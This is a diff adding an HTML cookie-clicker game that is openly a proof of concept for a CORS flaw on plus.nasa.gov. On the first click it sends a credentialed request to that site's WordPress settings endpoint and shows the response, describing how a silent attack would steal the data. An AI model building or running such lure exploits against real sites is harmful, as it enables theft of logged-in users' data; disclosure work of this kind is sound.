@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NASA Cookie Clicker 🚀🍪</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1435 50%, #2a1b3d 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* Estrellas animadas */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(2px 2px at 20% 30%, white, transparent),
+                radial-gradient(2px 2px at 60% 70%, white, transparent),
+                radial-gradient(1px 1px at 50% 50%, white, transparent),
+                radial-gradient(1px 1px at 80% 10%, white, transparent),
+                radial-gradient(2px 2px at 90% 60%, white, transparent);
+            background-size: 200px 200px;
+            animation: stars 50s linear infinite;
+            opacity: 0.5;
+        }
+
+        @keyframes stars {
+            from { background-position: 0 0; }
+            to { background-position: 0 200px; }
+        }
+
+        .container {
+            text-align: center;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            max-width: 600px;
+        }
+
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
+            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #4FC3F7; }
+        }
+
+        .subtitle {
+            font-size: 1.2em;
+            color: #4FC3F7;
+            margin-bottom: 30px;
+        }
+
+        .score-display {
+            font-size: 4em;
+            font-weight: bold;
+            margin: 30px 0;
+            color: #FFD700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+        }
+
+        .cookie {
+            font-size: 10em;
+            cursor: pointer;
+            display: inline-block;
+            transition: transform 0.1s ease;
+            filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.6));
+            user-select: none;
+        }
+
+        .cookie:hover {
+            transform: scale(1.1);
+        }
+
+        .cookie:active {
+            transform: scale(0.9);
+        }
+
+        .stats {
+            margin-top: 30px;
+            font-size: 1.2em;
+            color: #4FC3F7;
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(79, 195, 247, 0.1);
+            border: 1px solid rgba(79, 195, 247, 0.3);
+            border-radius: 10px;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+
+        .click-effect {
+            position: fixed;
+            font-size: 2em;
+            font-weight: bold;
+            color: #FFD700;
+            pointer-events: none;
+            animation: float-up 1s ease-out forwards;
+            z-index: 1000;
+        }
+
+        @keyframes float-up {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-100px);
+            }
+        }
+
+        .warning {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(255, 100, 100, 0.1);
+            border: 2px solid rgba(255, 100, 100, 0.3);
+            border-radius: 10px;
+            font-size: 0.85em;
+            text-align: left;
+        }
+
+        .warning strong {
+            color: #ff6b6b;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #FFD700;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 NASA Cookie Clicker 🍪</h1>
+        <p class="subtitle">Help NASA collect space cookies!</p>
+        
+        <div class="score-display" id="score">0</div>
+        
+        <div class="cookie" id="cookie" onclick="clickCookie()">🍪</div>
+        
+        <div class="stats">
+            <div>Total clicks: <span id="clicks">0</span></div>
+            <div>Cookies per second: <span id="cps">0</span></div>
+        </div>
+
+        <div class="message">
+            👾 Click the cookie to earn points<br>
+            🎯 How many cookies can you collect?
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Security Notice</strong>
+            This is a security research PoC. When you click, the game attempts to read
+            data from <code>plus.nasa.gov</code> to demonstrate a CORS vulnerability.
+        </div>
+    </div>
+
+    <script>
+        // Game variables
+        let score = 0;
+        let clicks = 0;
+        let exploitExecuted = false;
+
+        // Main click function
+        function clickCookie() {
+            score++;
+            clicks++;
+            
+            // Update display
+            document.getElementById('score').textContent = score;
+            document.getElementById('clicks').textContent = clicks;
+            
+            // Visual effect
+            showClickEffect(event);
+            
+            // Execute exploit on first click
+            if (!exploitExecuted) {
+                exploitExecuted = true;
+                setTimeout(executeCORSExploit, 2000); // 2 seconds after first click
+            }
+        }
+
+        // Visual click effect
+        function showClickEffect(event) {
+            const effect = document.createElement('div');
+            effect.className = 'click-effect';
+            effect.textContent = '+1';
+            effect.style.left = event.clientX + 'px';
+            effect.style.top = event.clientY + 'px';
+            document.body.appendChild(effect);
+            
+            setTimeout(() => effect.remove(), 1000);
+        }
+
+        // ========================================
+        // CORS EXPLOIT - Proof of Concept
+        // ========================================
+        
+        function executeCORSExploit() {
+            console.log('[CORS PoC] Executing exploit...');
+            
+            // NASA endpoints with CORS misconfiguration
+            const targetEndpoint = 'https://plus.nasa.gov/wp-json/wp/v2/settings';
+            
+            // Make request with credentials
+            fetch(targetEndpoint, {
+                method: 'GET',
+                credentials: 'include', // ← This includes the user's cookies
+                mode: 'cors'
+            })
+            .then(response => {
+                console.log('[CORS PoC] Status:', response.status);
+                return response.json();
+            })
+            .then(data => {
+                handleCORSResponse(data);
+            })
+            .catch(error => {
+                console.error('[CORS PoC] Error:', error);
+            });
+        }
+
+        function handleCORSResponse(data) {
+            // If it's a 401/403 error (not authenticated)
+            if (data.code === 'rest_forbidden' || data.code === 'rest_not_logged_in') {
+                showDemoAlert(data);
+            } else {
+                // Real data! (authenticated user)
+                showSuccessAlert(data);
+            }
+        }
+
+        function showDemoAlert(errorData) {
+            const message = `
+🔴 CORS VULNERABILITY DEMONSTRATION
+
+Endpoint: https://plus.nasa.gov/wp-json/wp/v2/settings
+
+What I can read (even with 401 error):
+${JSON.stringify(errorData, null, 2)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ CRITICAL SECURITY ISSUE:
+
+Even though this is a 401 error, I can read the COMPLETE response
+due to the CORS misconfiguration on plus.nasa.gov.
+
+If you were an authenticated NASA employee, instead of this error,
+I would see and steal:
+• Site configuration
+• Administrator emails
+• Internal WordPress data
+• Any information this endpoint returns
+
+And you would see NOTHING - the game would continue normally
+while your data is sent to a server I control.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+This alert is only shown for demonstration purposes.
+In a real attack, there would be no alert.
+            `.trim();
+            
+            alert(message);
+        }
+
+        function showSuccessAlert(data) {
+            const message = `
+🎯 AUTHENTICATION DETECTED!
+
+You are logged in to plus.nasa.gov, so I can read your data:
+
+${JSON.stringify(data, null, 2).substring(0, 500)}...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ In a real attack, this data would be:
+1. Sent to an attacker's server
+2. Completely silent (no alert)
+3. Stolen while you play
+4. You would never know it was stolen
+
+This demonstrates the full impact of the CORS vulnerability.
+            `.trim();
+            
+            alert(message);
+        }
+
+        // Auto-load saved data
+        window.onload = function() {
+            const saved = localStorage.getItem('nasaCookies');
+            if (saved) {
+                score = parseInt(saved);
+                document.getElementById('score').textContent = score;
+            }
+        };
+
+        // Auto-save
+        setInterval(() => {
+            localStorage.setItem('nasaCookies', score);
+        }, 5000);
+
+        console.log('🚀 NASA Cookie Clicker loaded');
+        console.log('👾 Click to start playing');
+        console.log('⚠️  CORS exploit will execute after first click');
+    </script>
+</body>
+</html>
+
